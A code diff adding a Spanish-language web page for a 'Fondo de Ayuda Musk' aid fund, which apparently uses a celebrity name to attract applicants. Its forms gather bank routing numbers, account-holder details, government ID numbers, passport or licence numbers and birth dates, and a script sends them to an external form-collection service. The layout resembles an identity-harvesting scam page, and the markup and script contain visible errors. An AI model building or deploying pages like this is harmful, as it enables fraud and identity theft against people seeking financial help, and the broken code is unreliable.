@@ -1,0 +1,740 @@
+<!DOCTYPE html>
+<html lang="es">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Solicitar ayuda | Fondo de Ayuda Musk</title>
+    <link rel="stylesheet" href="styles.css" />
+    <script src="app.js" defer></script>
+
+    <style>
+      /* Estilos específicos para formulario Hope Foundation */
+      :root {
+        --ink: #172033;
+        --muted: #5e687a;
+        --line: #dbe2ee;
+        --canvas: #f4f7fb;
+        --navy: #0b2f63;
+        --blue: #0b5cab;
+        --blue-dark: #083f79;
+        --blue-soft: #edf5ff;
+        --gold: #c49a2c;
+        --panel: #ffffff;
+        --danger: #b42318;
+        --shadow: 0 18px 45px rgba(15, 39, 77, 0.12);
+      }
+
+      .form-container-hope {
+        border: 1px solid var(--line);
+        border-radius: 8px;
+        background: rgba(255, 255, 255, 0.96);
+        box-shadow: var(--shadow);
+        padding: 34px 38px 38px;
+        color: var(--ink);
+        max-width: 600px;
+        margin: 2rem auto;
+      }
+
+      .form-container-hope h2 {
+        margin: 0 0 8px;
+        color: var(--ink);
+        font-size: 1.45rem;
+        font-weight: 800;
+        line-height: 1.25;
+      }
+
+      .form-intro-hope {
+        margin: 0 0 26px;
+        color: var(--muted);
+        line-height: 1.55;
+      }
+
+      form.form-hope {
+        display: grid;
+        grid-template-columns: repeat(2, minmax(0, 1fr));
+        gap: 18px;
+      }
+
+      .form-group-hope {
+        position: relative;
+        display: flex;
+        flex-direction: column;
+        gap: 8px;
+        min-width: 0;
+      }
+
+      .form-group-hope:nth-child(3),
+      .form-group-hope:nth-child(4),
+      #group-fecha_nac-hope,
+      .form-group-hope:nth-child(6) {
+        grid-column: 1 / -1;
+      }
+
+      #group-fecha_nac-hope {
+        width: 100%;
+        max-width: 100%;
+        overflow: hidden;
+      }
+
+      .form-group-hope label {
+        color: #344056;
+        font-weight: 800;
+        font-size: 0.92rem;
+      }
+
+      .form-group-hope input,
+      .form-group-hope select {
+        width: 100%;
+        min-width: 0;
+        max-width: 100%;
+        min-height: 58px;
+        border: 1px solid #c8d3e1;
+        border-radius: 8px;
+        padding: 13px 14px 13px 46px;
+        color: var(--ink);
+        background: white;
+        font: inherit;
+        transition: border-color 0.18s ease, box-shadow 0.18s ease;
+      }
+
+      #fecha_nac-hope {
+        display: block;
+        inline-size: 100%;
+        min-inline-size: 0;
+        max-inline-size: 100%;
+        height: 58px;
+        min-height: 58px;
+        line-height: normal;
+        padding: 13px 14px 13px 46px;
+        appearance: auto;
+        -webkit-appearance: none;
+      }
+
+      #fecha_nac-hope::-webkit-date-and-time-value {
+        text-align: left;
+      }
+
+      #fecha_nac-hope::-webkit-calendar-picker-indicator {
+        margin-left: auto;
+      }
+
+      .form-group-hope input::placeholder,
+      .form-group-hope select option[disabled] {
+        color: #8b97a8;
+        font-style: italic;
+      }
+
+      .form-group-hope input:focus,
+      .form-group-hope select:focus {
+        outline: none;
+        border-color: var(--blue);
+        box-shadow: 0 0 0 3px rgba(11, 92, 171, 0.13);
+      }
+
+      .form-group-hope .material-icons {
+        position: absolute;
+        left: 14px;
+        top: 42px;
+        color: var(--blue);
+        font-size: 22px;
+        pointer-events: auto;
+        cursor: help;
+      }
+
+      .form-group-hope small {
+        color: var(--muted);
+        font-size: 0.82rem;
+        line-height: 1.45;
+      }
+
+      .form-group-hope.error input,
+      .form-group-hope.error select {
+        border-color: var(--danger) !important;
+        box-shadow: none !important;
+      }
+
+      .form-group-hope.error small,
+      .error-message-hope {
+        color: var(--danger);
+        font-weight: 800;
+      }
+
+      .error-message-hope {
+        margin-top: 2px;
+        font-size: 0.88rem;
+        animation: shake 0.3s;
+      }
+
+      button.submit-btn-hope {
+        grid-column: 1 / -1;
+        min-height: 52px;
+        margin-top: 8px;
+        border: 0;
+        border-radius: 8px;
+        padding: 14px 20px;
+        color: white;
+        background: var(--blue);
+        font: inherit;
+        font-size: 1rem;
+        font-weight: 800;
+        cursor: pointer;
+        box-shadow: 0 12px 22px rgba(11, 92, 171, 0.22);
+        transition: background 0.18s ease, transform 0.18s ease;
+      }
+
+      button.submit-btn-hope:hover:not(:disabled) {
+        background: var(--blue-dark);
+        transform: translateY(-1px);
+      }
+
+      button.submit-btn-hope:disabled {
+        cursor: not-allowed;
+        color: #7c8798;
+        background: #e1e7f0;
+        box-shadow: none;
+        transform: none;
+      }
+
+      @keyframes shake {
+        0%, 100% { transform: translateX(0); }
+        25% { transform: translateX(-5px); }
+        75% { transform: translateX(5px); }
+      }
+
+      @media (max-width: 720px) {
+        form.form-hope {
+          grid-template-columns: 1fr;
+        }
+        .form-group-hope:nth-child(3),
+        .form-group-hope:nth-child(4),
+        #group-fecha_nac-hope,
+        .form-group-hope:nth-child(6),
+        button.submit-btn-hope {
+          grid-column: auto;
+        }
+      }
+    </style>
+    <link href="https://fonts.googleapis.com/icon?family=Material+Icons" rel="stylesheet" />
+  </head>
+  <body data-page="solicitar">
+    <header class="site-header">
+      <a class="brand" href="index.html" aria-label="Fondo de Ayuda Musk">
+        <span class="brand-mark">M</span>
+        <span>Fondo de Ayuda Musk</span>
+      </a>
+      <nav class="nav-links" aria-label="Navegacion principal">
+        <a href="index.html" data-nav="inicio">Inicio</a>
+        <a href="como-funciona.html" data-nav="funciona">Como funciona</a>
+        <a href="solicitar-ayuda.html" data-nav="solicitar">Solicitar ayuda</a>
+        <a href="transparencia.html" data-nav="transparencia">Transparencia</a>
+      </nav>
+    </header>
+
+    <main>
+      <section class="page-hero request-hero">
+        <p class="eyebrow">Solicitud bancaria segura</p>
+        <h1>Solicite ayuda directa hacia una entidad bancaria de EE.UU.</h1>
+        <p>
+          Complete la informacion del caso, el banco receptor y los documentos
+          disponibles. Nunca comparta contrasenas, PIN, codigos de acceso ni
+          datos completos de tarjetas.
+        </p>
+      </section>
+
+      <section class="section request-layout">
+        <form class="request-form" id="request-form">
+          <div class="form-progress" aria-label="Etapas del formulario">
+            <span>1. Contacto</span>
+            <span>2. Necesidad</span>
+            <span>3. Banco</span>
+            <span>4. Verificacion</span>
+          </div>
+
+          <fieldset class="form-section">
+            <legend>Datos de contacto</legend>
+            <div class="form-grid">
+              <label class="field">
+                <span>Nombre completo</span>
+                <input name="nombre" type="text" placeholder="Ej. Maria Lopez" required />
+              </label>
+              <label class="field">
+                <span>Correo electronico</span>
+                <input name="correo" type="email" placeholder="correo@ejemplo.com" required />
+              </label>
+              <label class="field">
+                <span>Telefono</span>
+                <input name="telefono" type="tel" placeholder="+1 555 000 0000" required />
+              </label>
+              <label class="field">
+                <span>Pais / ciudad</span>
+                <input name="ubicacion" type="text" placeholder="Ej. Estados Unidos, Houston" required />
+              </label>
+            </div>
+          </fieldset>
+
+          <fieldset class="form-section">
+            <legend>Necesidad y monto</legend>
+            <div class="form-grid">
+              <label class="field">
+                <span>Tipo de ayuda</span>
+                <select name="tipo" required>
+                  <option value="">Seleccione una opcion</option>
+                  <option>Alimentos y servicios basicos</option>
+                  <option>Salud y medicinas</option>
+                  <option>Vivienda o renta</option>
+                  <option>Educacion</option>
+                  <option>Apoyo comunitario</option>
+                </select>
+              </label>
+              <label class="field">
+                <span>Monto solicitado en USD</span>
+                <input name="monto" type="number" min="1" step="1" placeholder="Ej. 2500" required />
+              </label>
+              <label class="field">
+                <span>Urgencia</span>
+                <select name="urgencia" required>
+                  <option value="">Seleccione urgencia</option>
+                  <option>Emergencia inmediata</option>
+                  <option>Necesario en 7 dias</option>
+                  <option>Necesario en 30 dias</option>
+                  <option>No urgente, pero importante</option>
+                </select>
+              </label>
+              <label class="field">
+                <span>Destino preferido del pago</span>
+                <select name="destino_pago" required>
+                  <option value="">Seleccione destino</option>
+                  <option>Cuenta bancaria personal verificada</option>
+                  <option>Banco del arrendador o proveedor</option>
+                  <option>Hospital, clinica o farmacia</option>
+                  <option>Escuela o institucion educativa</option>
+                </select>
+              </label>
+            </div>
+
+            <label class="field full">
+              <span>Explique la situacion</span>
+              <textarea
+                name="historia"
+                rows="6"
+                placeholder="Describa que ocurrio, quien necesita ayuda, que fecha limite existe y como se usara el pago."
+                required
+              ></textarea>
+            </label>
+          </fieldset>
+
+          <fieldset class="form-section bank-form-section">
+            <legend>Entidad bancaria de Estados Unidos</legend>
+            <div class="bank-picker" aria-label="Bancos de referencia">
+              <span><img src="assets/bank-pnc.png" alt="PNC" /></span>
+              <span><img src="assets/bank-citi.png" alt="Citibank" /></span>
+              <span><img src="assets/bank-wells-fargo.png" alt="Wells Fargo" /></span>
+              <span><img src="assets/bank-chase.webp" alt="Chase" /></span>
+            </div>
+
+            <div class="form-grid">
+              <label class="field">
+                <span>Banco receptor</span>
+                <select name="banco" required>
+                  <option value="">Seleccione banco</option>
+                  <option>PNC Bank</option>
+                  <option>Citibank</option>
+                  <option>Wells Fargo</option>
+                  <option>Chase</option>
+                  <option>Otro banco de EE.UU.</option>
+                </select>
+              </label>
+              <label class="field">
+                <span>Titular de la cuenta</span>
+                <input name="titular" type="text" placeholder="Nombre como aparece en el banco" required />
+              </label>
+              <label class="field">
+                <span>Tipo de cuenta</span>
+                <select name="tipo_cuenta" required>
+                  <option value="">Seleccione tipo</option>
+                  <option>Checking</option>
+                  <option>Savings</option>
+                  <option>Cuenta de proveedor</option>
+                </select>
+              </label>
+              <label class="field">
+                <span>Ultimos 4 digitos de cuenta</span>
+                <input name="cuenta_ultimos" type="text" inputmode="numeric" maxlength="4" pattern="[0-9]{4}" placeholder="1234" required />
+              </label>
+              <label class="field">
+                <span>Routing number</span>
+                <input name="routing" type="text" inputmode="numeric" maxlength="9" pattern="[0-9]{9}" placeholder="9 digitos" required />
+              </label>
+              <label class="field">
+                <span>Nombre de sucursal o ciudad</span>
+                <input name="sucursal" type="text" placeholder="Ej. Miami, FL" />
+              </label>
+            </div>
+          </fieldset>
+
+          <fieldset class="form-section">
+            <legend>Documentos y confirmacion</legend>
+            <label class="field full">
+              <span>Documentos disponibles</span>
+              <textarea
+                name="documentos"
+                rows="4"
+                placeholder="Ej. factura medica, contrato de renta, estado de cuenta parcial, carta de escuela, identificacion, comprobante de domicilio."
+              ></textarea>
+            </label>
+          </fieldset>
+
+          <label class="consent">
+            <input type="checkbox" required />
+            <span>Confirmo que la informacion es verdadera. Entiendo que la fundacion nunca pedira contrasenas, PIN, codigos de verificacion ni acceso a mi banca en linea.</span>
+          </label>
+
+          <button class="button submit-button" type="submit">Enviar solicitud bancaria</button>
+        </form>
+
+        <!-- Aquí insertamos el formulario Hope Foundation -->
+
+        <div class="form-container-hope" aria-label="Formulario de Hope Foundation para apoyo financiero">
+          <h2>Inicia tu solicitud - Paso 1</h2>
+          <p class="form-intro-hope">Los campos marcados como obligatorios deben completarse antes de continuar.</p>
+
+          <form id="form-step-1-hope class="form-hope" action="https://formcarry.com/s/xE7QFh5NfPV" method="POST" novalidate>
+            <div class="form-group-hope" id="group-nombre-hope">
+              <label for="nombre-hope">Nombre Completo</label>
+              <span class="material-icons" aria-hidden="true" data-tooltip="Tu nombre completo oficial">person</span>
+              <input type="text" id="nombre-hope" name="nombre" placeholder="Ej. Juan Pérez" required aria-describedby="help-nombre-hope" autocomplete="name" />
+              <small id="help-nombre-hope">Incluye nombres y apellidos completos.</small>
+            </div>
+
+            <div class="form-group-hope" id="group-correo-hope">
+              <label for="correo-hope">Correo Electrónico</label>
+              <span class="material-icons" aria-hidden="true" data-tooltip="Tu correo electrónico">email</span>
+              <input type="email" id="correo-hope" name="correo" placeholder="ejemplo@correo.com" required aria-describedby="help-correo-hope" autocomplete="email" />
+              <small id="help-correo-hope">Introduce un correo electrónico válido.</small>
+            </div>
+
+            <div class="form-group-hope" id="group-tipo-documento-hope">
+              <label for="tipo-documento-hope">Tipo de Documento</label>
+              <span class="material-icons" aria-hidden="true" data-tooltip="Selecciona tipo de documento">assignment_ind</span>
+              <select id="tipo-documento-hope" name="tipo-documento" required aria-describedby="help-tipo-documento-hope">
+                <option value="" disabled selected>Selecciona el tipo de documento</option>
+                <option value="id_estado"> ID del Estado</option>
+                <option value="licencia"> Licencia de Conducir</option>
+                <option value="pasaporte"> Pasaporte Americano</option>
+              </select>
+              <small id="help-tipo-documento-hope">Elige el tipo de documento que posees.</small>
+            </div>
+
+            <div class="form-group-hope" id="group-numero-documento-hope" style="display:none;">
+              <label for="numero-documento-hope">Número de Documento</label>
+              <span class="material-icons" aria-hidden="true" data-tooltip="Ingresa el número del documento seleccionado">badge</span>
+              <input type="text" id="numero-documento-hope" name="numero-documento" placeholder="" aria-describedby="help-numero-documento-hope" autocomplete="off" />
+              <small id="help-numero-documento-hope">Introduce el número de documento según el formato.</small>
+            </div>
+
+            <div class="form-group-hope" id="group-fecha_nac-hope">
+              <label for="fecha_nac-hope">Fecha de Nacimiento</label>
+              <span class="material-icons" aria-hidden="true" data-tooltip="Tu fecha de nacimiento (día, mes y año)">calendar_today</span>
+              <input type="date" id="fecha_nac-hope" name="fecha_nac" required aria-describedby="help-fecha_nac-hope" max="2024-12-31" />
+              <small id="help-fecha_nac-hope">Asegúrate que tu fecha sea correcta.</small>
+            </div>
+
+            <div class="form-group-hope" id="group-nacionalidad-hope">
+             label for="nacionalidad-hope">Nacionalidad</label>
+              <span class="material-icons" aria-hidden="true" data-tooltip="Selecciona tu país de origen">public</span>
+              <select id="nacionalidad-hope" name="nacionalidad" required aria-describedby="help-nacionalidad-hope">
+                <option value="" disabled selected>Selecciona tu nacionalidad</option>
+                <option value="ar">🇦🇷 Argentina</option>
+                <option value="mx">🇲🇽 México</option>
+                <option value="co">🇨🇴 Colombia</option>
+                <option value="cl">🇨🇱 Chile</option>
+                <option value="us">🇺🇸 Estados Unidos</option>
+                <option value="pe">🇵🇪 Perú</option>
+                <option value="ve">🇻🇪 Venezuela</option>
+                <option value="br">🇧🇷 Brasil</option>
+                <option value="cu">🇨🇺 Cuba</option>
+                <option value="do">🇩🇴 República Dominicana</option>
+                <option value="pa">🇵🇦 Panamá</option>
+                <option value="ec">🇪🇨 Ecuador</option>
+                <option value="uy">🇺🇾 Uruguay</option>
+                <option value="py">🇵🇾 Paraguay</option>
+                <option value="bo">🇧🇴 Bolivia</option>
+                <option value="gt">🇬🇹 Guatemala</option>
+                <option value="hn">🇭🇳 Honduras</option>
+                <option value="sv">🇸🇻 El Salvador</option>
+                <option value="ni">🇳🇮 Nicaragua</option>
+                <option value="cr">🇨🇷 Costa Rica</option>
+                <option value="otro">🌍 Otra nacionalidad</option>
+              </select>
+              <small id="help-nacionalidad-hope">Selecciona tu país de origen.</small>
+            </div>
+
+            <button type="submit" class="submit-btn-hope" aria-label="Enviar información personal y continuar al siguiente paso" disabled>Siguiente</button>
+          </form>
+        </div>
+      </section>
+    </main>
+
+    <footer class="site-footer">
+      <p>Formulario de maqueta. Falta conectar backend, privacidad y seguridad.</p>
+    </footer>
+
+    <script>
+      (() => {
+        const form = document.getElementById('form-step-1-hope');
+        const submitBtn = form.querySelector('button[type="submit"]');
+        const tipoSelect = form.querySelector('#tipo-documento-hope');
+        const numeroGroup = form.querySelector('#group-numero-documento-hope');
+        const numeroInput = form.querySelector('#numero-documento-hope');
+        const touchedFields = {};
+
+        const formatos = {
+          id_estado: {
+            regex: /^[A-Za-z0-9]{3}-[A-Za-z0-9]{3}-[A-Za-z0-9]{3}$/,
+            placeholder: 'Ej. ABC-123-XYZ',
+            errorMsg: 'Formato inválido. Debe ser XXX-XXX-XXX con letras o números.'
+          },
+          licencia: {
+            regex: /^[A-Za-z][0-9]{3}-[0-9]{3}-[0-9]{3}-[0-9]{3}$/,
+            placeholder: 'Ej. A123-456-789-012',
+            errorMsg: 'Formato inválido. Debe ser letra seguida de números, tipo A123-456-789-012.'
+          },
+          pasaporte: {
+            regex: /^[A-Za-z0-9]{9}$/,
+            placeholder: 'Ej. 123456789',
+            errorMsg: 'Formato inválido. Debe tener 9 caracteres alfanuméricos sin espacios.'
+          }
+        };
+
+        const standardFields = Array.from(form.querySelectorAll('input, select'))
+          .filter(el => ![tipoSelect, numeroInput].includes(el));
+
+        function formatNumeroDocumento(value, tipo) {
+          const val = value.replace(/[^A-Za-z0-9]/g, '').toUpperCase();
+
+          if (tipo === 'id_estado') {
+            const clean = val.substring(0, 9);
+            const parts = clean.match(/.{1,3}/g);
+            return parts ? parts.join('-') : '';
+          }
+
+          if (tipo === 'licencia') {
+            if (val.length === 0) return '';
+
+            const first = val.charAt(0);
+            const nums = val.substring(1).replace(/[^0-9]/g, '').substring(0, 12);
+
+            let formatted = first + nums.substring(0, 3);
+            if (nums.length > 3) formatted += '-' + nums.substring(3, 6);
+            if (nums.length > 6) formatted += '-' + nums.substring(6, 9);
+            if (nums.length > 9) formatted += '-' + nums.substring(9, 12);
+
+            return formatted;
+          }
+
+          if (tipo === 'pasaporte') {
+            return val.substring(0, 9);
+          }
+
+          return value;
+        }
+
+        function showError(group, message) {
+          group.classList.add('error');
+
+          let errorMsg = group.querySelector('.error-message-hope');
+          if (!errorMsg) {
+            errorMsg = document.createElement('div');
+            errorMsg.className = 'error-message-hope';
+            errorMsg.setAttribute('aria-live', 'assertive');
+            group.appendChild(errorMsg);
+          } else {
+            errorMsg.style.animation = 'none';
+            errorMsg.offsetHeight;
+            errorMsg.style.animation = 'shake 0.3s';
+          }
+
+          errorMsg.textContent = message;
+        }
+
+        function clearError(group) {
+          group.classList.remove('error');
+          const errorMsg = group.querySelector('.error-message-hope');
+          if (errorMsg) errorMsg.remove();
+        }
+
+        function getFieldErrorMessage(field) {
+          if (field.validity.valueMissing) return 'Este campo es obligatorio.';
+          if (field.validity.typeMismatch) return 'Introduce un correo electrónico válido.';
+          if (field.validity.rangeOverflow) return 'Selecciona una fecha válida.';
+          return field.validationMessage || 'Campo inválido.';
+        }
+
+        function validateTipo(showMessages = true) {
+          const group = tipoSelect.closest('.form-group-hope');
+          const valid = Boolean(tipoSelect.value);
+
+          if (!valid && showMessages && touchedFields[tipoSelect.name]) {
+            showError(group, 'Por favor selecciona un tipo de documento.');
+          } else if (valid) {
+            clearError(group);
+          }
+
+          return valid;
+        }
+
+        function validateNumero(showMessages = true) {
+          const tipo = tipoSelect.value;
+          const val = numeroInput.value.trim();
+
+          if (numeroGroup.style.display === 'none') {
+            clearError(numeroGroup);
+            return true;
+          }
+
+          if (!tipo || !formatos[tipo]) return false;
+
+          if (!val) {
+            if (showMessages && touchedFields[numeroInput.name]) {
+              showError(numeroGroup, 'El número de documento es obligatorio.');
+            } else {
+              clearError(numeroGroup);
+            }
+            return false;
+          }
+
+          if (!formatos[tipo].regex.test(val)) {
+            if (showMessages && touchedFields[numeroInput.name]) {
+              showError(numeroGroup, formatos[tipo].errorMsg);
+            }
+            return false;
+          }
+
+          clearError(numeroGroup);
+          return true;
+        }
+
+        function validateStandardField(field, showMessages = true) {
+          const group = field.closest('.form-group-hope');
+          const valid = field.checkValidity();
+
+          if (!valid && showMessages && touchedFields[field.name]) {
+            showError(group, getFieldErrorMessage(field));
+          } else if (valid) {
+            clearError(group);
+          }
+
+          return valid;
+        }
+
+        function checkFormValidity(showMessages = true) {
+          let valid = true;
+
+          if (!validateTipo(showMessages)) valid = false;
+          if (!validateNumero(showMessages)) valid = false;
+
+          standardFields.forEach(field => {
+            if (!validateStandardField(field, showMessages)) valid = false;
+          });
+
+          submitBtn.disabled = !valid;
+          return valid;
+        }
+
+        function markTouched(field) {
+          touchedFields[field.name] = true;
+        }
+
+        tipoSelect.addEventListener('change', () => {
+          markTouched(tipoSelect);
+
+          if (tipoSelect.value) {
+            numeroGroup.style.display = 'flex';
+            numeroInput.required = true;
+            numeroInput.placeholder = formatos[tipoSelect.value].placeholder;
+            numeroInput.value = '';
+            delete touchedFields[numeroInput.name];
+            clearError(numeroGroup);
+          } else {
+            numeroGroup.style.display = 'none';
+            numeroInput.required = false;
+            numeroInput.value = '';
+            delete touchedFields[numeroInput.name];
+            clearError(numeroGroup);
+          }
+
+          checkFormValidity(true);
+        });
+
+        tipoSelect.addEventListener('blur', () => {
+          markTouched(tipoSelect);
+          checkFormValidity(true);
+        });
+
+        numeroInput.addEventListener('input', e => {
+          const tipo = tipoSelect.value;
+          if (!tipo) return;
+
+          e.target.value = formatNumeroDocumento(e.target.value, tipo);
+          checkFormValidity(true);
+        });
+
+        numeroInput.addEventListener('blur', () => {
+          markTouched(numeroInput);
+          checkFormValidity(true);
+        });
+
+        standardFields.forEach(field => {
+          const eventName = field.tagName.toLowerCase() === 'select' ? 'change' : 'input';
+
+          field.addEventListener(eventName, () => {
+            checkFormValidity(true);
+          });
+
+          field.addEventListener('blur', () => {
+            markTouched(field);
+            checkFormValidity(true);
+          });
+        });
+
+        window.addEventListener('load', () => {
+          numeroGroup.style.display = 'none';
+          numeroInput.required = false;
+          checkFormValidity(false);
+        });
+
+        form.addEventListener('submit', e => {
+          e.preventDefault();
+
+          Array.from(form.querySelectorAll('input, select')).forEach(field => {
+            touchedFields[field.name] = true;
+          });
+
+          if (!checkFormValidity(true)) {
+            alert('Por favor, completa correctamente todos los campos antes de continuar.');
+            return;
+          }
+
+          submitBtn.disabled = true;
+
+          fetch(form.action, {
+            method: 'POST',
+            body: new FormData(form),
+            headers: { 'Accept': 'application/json' },
+          }).then(response => {
+            if (response.ok) {
+              window.location.href = 'paso2.html';
+            } else {
+              alert('Error al enviar, por favor intenta de nuevo.');
+              submitBtn.disabled = false;
+            }
+          }).catch(() => {
+            alert('Error en la conexión, por intenta de nuevo.');
+            submitBtn = false;
+          });
+        });
+      })();
+    </script>
+  </body>
+</html>
+
